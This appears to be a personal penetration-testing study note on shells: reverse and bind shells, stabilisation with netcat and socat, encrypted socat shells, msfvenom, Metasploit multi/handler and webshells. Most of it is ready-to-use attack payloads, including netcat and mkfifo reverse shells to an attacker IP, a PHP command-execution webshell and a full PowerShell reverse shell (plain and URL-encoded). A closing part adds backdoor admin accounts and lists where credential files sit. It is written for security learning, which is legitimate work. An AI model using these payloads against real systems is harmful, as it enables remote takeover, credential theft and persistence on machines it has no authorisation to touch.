# Shells
## Reverse Shells
Reverse shells are when the target is forced to execute code that connects back to our computer. On our own computer we would set up a listener which would be used to receive the connection. They are a good way to bypass firewall rules that may prevent us from connecting to arbitrary posts on the target, however, when receiving a shell from a machine across the internet, we would need to configure our own network to accept the shell. 

## Bind Shells
Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet meaning we can connect to the port that the code has opened and obtain RCE. This has the advantage of not requiring any configuration on our own network, but may be prevented by firewalls protecting the target.

## Interactive
These type of shells allow us to interact with programs after executing them, an example of this is the prompt that [[SSH]] gives us after entering the command, with interactive shells we will receive the prompt and are allowed to interact with it as if it were a normal CLI environment.

## Non-Interactive
Contrary to interactive shells, these shells do not allow programs that require user interaction in order to run, when running commands like [[SSH]], nano, etc. the prompt will no appear in our shell, but commands like cat or whoami work fine.

# Tools
## Netcat
[[Netcat]] is the most basic tool when it comes to any kind of networking. 

### Reverse
To set up a reverse shell we can start by creating a listener in our machine with the following syntax
```sh
nc -nlvp PORT
```
this will make it so netcat does not resolves hosts names or uses DNS, is a listener, uses verbose and sets it to a specified port.
We then can connect to this with any number of payloads depending on the environment on the target, like (for linux)
```
nc ATTACK_IP PORT -e /bin/bash
```
For us to gain RCE

### Bind
To use a Bind shell we need to first establish a listener on the target waiting for us to connect to it, depending on the environment this can also be accomplished with netcat with a basic listener and adding either `-e "cmd.exe"`
for windows or `-e /bin/bash` for linux. 
Then we can connect to it with
```sh
nc TARGET PORT
```

### Stabilisation
These shells are very unstable by default, they are non-interactive and often have strange formatting errors, this is due to netcat 'shells' really being processes running inside a terminal, rather than being genuine terminals.
#### Python
1. The first thing to do is use `python3 -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
2. Step two is: `export TERM=xterm` -- this will give us access to term commands such as `clear`.
3. Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes, `reset` when we finish to return to normal). It then foregrounds the shell, thus completing the process.
#### rlwrap
rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap`.

To use rlwrap, we invoke a slightly different listener:

`rlwrap nc -lvnp <port>`  

Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell.



## Socat
Similar to [[Netcat]] in some ways, [[Socat]] is a connector between two points, as it provides a link between two points, whether they be  a listening port and a keyboard, a listening port and a file or two listening ports
### Reverse
The syntax for [[Socat]] gets more complicated than that of Netcat, for a reverse shell listener, the syntax is the following 
```sh
socat TCP-L:<port> -
``` 
 
This is taking two points (a listening port and standard input) and connecting them together. The resulting shell is unstable. (this is the equivalent to `nc -lnvp <port>`).

Then we can connect to the listener in the target machine with the following for a linux target

```sh
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```
Or the following on a windows target
```sh
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```
The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.


### Bind
On a linux target we set up the listener as the following
```sh
socat TCP-L:<PORT> EXEC:"bash -li"
```
While on windows
```sh
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

Regardless of the target we use the following on our attacking machine to connect to the listener
```sh
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

### Stabilisation
One of the advantages of socat is its versatility, one of the ways in which we can use this is to significantly stabilise the reverse shell. In the case of a linux target we can use
```sh
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
Which would, as usual connect two points together through TCP, in this case these two points are a listening port and a file, specifically, we are passing the current TTY as a file and setting the echo to be zero. This is the equivalent to using the Ctrl+Z `stty raw -echo; fg` trick with a netcat shell, with the benefit of being immediately stable and hooking into a full tty.

The normal listener can be connected to with any payload, however, this special listener must be activated with a very specific socat command, meaning the target must also have socat installed. As not all targets are gonna have it, we can upload a [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true), which can then be executed as normal.
The command is as follows
```sh
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
First we are linking with the listener running on our own machine. Then it creates an interactive bash session with `EXEC:"bash -li"` and then we pass the following arguments
* pty: allocates a pseudoterminal on the target 
* stderr: makes sure that any error messages get shown in the shell
* sigint: passes any Ctrl+C commands through into the sub-process, allowing us to kill commands inside the shell
* setsid: creates the process in a new session
* sane: stabilises the terminal, attempting to "normalise" it

### Encryption
One of the cool things about socat is that it's capable of creating encrypted shells, for both bind and reverse shells. This means that the shells cannot be spied on unless we have the decryption key, and are often able to bypass and IDS as a result. 
Unlike with the normal syntax that uses `TCP` we will instead replace it with `OPENSSL`. 
First tho we need to generate a certificate in order to use encrypted shells. 
```sh
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
This command creates a 2048 bit RSA key with a matching cert file, self-signed, and valid for just under a year. When running this command it will ask us to fill in information about the certificate, it can be left blank or filled randomly. Then we need to merge the two created files into a single `.pem` file.
```sh
cat shell.key shell.crt > shell.pem
```
Now, when we set up our reverse shell listener we use
```sh
socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 -
```
This sets up an OPENSSL listener using our generated certificate. `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority.
Then to connect back we can use
```sh
socat OPENSSL:<local-ip>:<local-port>,verify=0 EXEC:/bin/bash
```

The same applying for a bind shell
Target:
```sh
socat OPENSSL-LISTENER:<port>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```
Attacker:
```sh
socat OPENSSL:<target-ip>:<target-port>,veify=0 -
```


## msfvenom
The GOAT. Part of the [[Metasploit#Msfvenom|Metasploit]] framework, msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a [[Buffer Overflow]] exploit. However, it can also be used to generate payloads in various formats. It's this latter function that is really useful.
The standard syntax for msfvenom is as follows
`msfvenom -p <payload> <options>`


## Metasploit multi/handler
Multi/Handler is the tool for catching reverse shells. It is essential if we want to use Meterpreter shells, and is the go-to when using staged payloads. To use it we only need to open Metasploit with `msfconsole` and type `use multi/handler`. We are now primed to start a multi/handler session.
We can look at the available options using the `options` command.
From here we need to set three options: LHOST, LPORT, payload.
Now we can start the listener with `exploit -j`, this tells Metasploit to launch the module, running as a job in the background.
When the staged payload generated with msfvenom is run, Metasploit receives the connection, and sends the remainder of the payload and gives us a reverse shell.

## WebShells
There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible. In these cases we would instead upload a webshell. 
An example of a very basic one-liner for PHP can be 
```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```
This will take a GET parameter in the URL and execute it on the system with `shell_exec()`. Essentially, what this means is that any commands we enter in the URL after `?cmd=` will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page.

There are a variety of webshells available on Kali by default at `/usr/share/webshells`.  Note that for a Windows target is often easiest to obtain RCE using a web shell or by using msfvenom to generate a reverse/bind shell in the language of the server. With the former, obtaining RCE is often done with a URL encoded powershell reverse shell. This would be copied into the URL as the `cmd` argument
```sh
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```
which is the same as [[Shells#Powershell|this one]]

# Payloads
 Refer to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) for a cool repository 
### Netcat
[[Netcat]] has an option `-e` that allows us to execute a process on connection. For example, as a listener
```sh
nc -lnvp <port> -e /bin/bash
```
Connecting to the above listener with would result in a bind shell on the target. Equally, for a reverse shell, connecting back with 
```sh
nc <ip> <port> -e /bin/bash 
```
would result in a reverse shell on the target

However this is not included in most versions of netcat is it is widely seen to be very insecure. While on windows where a static binary is nearly always required anyway, this technique will work perfectly. On Linux, however, we would instead use this code to create a listener for a bind shell:
```sh
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

*The command first creates a [named pipe](https://www.linuxjournal.com/article/2156) at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into `sh`, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.*

A very similar command can be used to send a netcat reverse shell
```sh
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax

## Powershell
When targeting a modern Windows Server, it is very common to require a Powershell reverse shell. The following one-liner can be really useful
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
In order to use this, we need to replace both `<ip>` and `<port>`, we can then copy it into a cmd.exe shell (or another method of executing commands on a Windows server, such as [[Shells#WebShells|webshells]]) and execute it, resulting in a reverse shell

# Gaining ground
One thing that all shells have in common is that they tend to be unstable and non-interactive. Even Unix style shells which are easier to stabilise are not ideal. So our objective should always be on looking for opportunities to gain access to a user account.

On linux, SSH keys stored at `/home/<user>/.ssh` are often an ideal way to do this. Some exploits will also allow us to add our own account, like [[Dirty C0w]] or a writable /etc/shadow or /etc/passwd would quickly gives us SSH access to the machine, assuming it is open.

On windows, the options are more limited. It is sometimes possible to find passwords for running services in the registry. VNC servers, for example frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file  at `C:\Program Files\FileZilla Server\FileZilla Server.xml` or `C:\xampp\FileZilla Server\FileZilla Server.xml`. These can be MD5 hashes or in plaintext, depending on the version.

Ideally on Windows we would obtain a shell running as the SYSTEM user, or an admin account. In such a situation it is possible to add our own account to the machine, then log in over [[RDP]], [[Telnet]], [[winexe]], [[psexec]], [[WinRM]], or any other method.
The syntax for this is as follows
```
net user <username> <password> /add
net localgroup administrators <username> /add
```
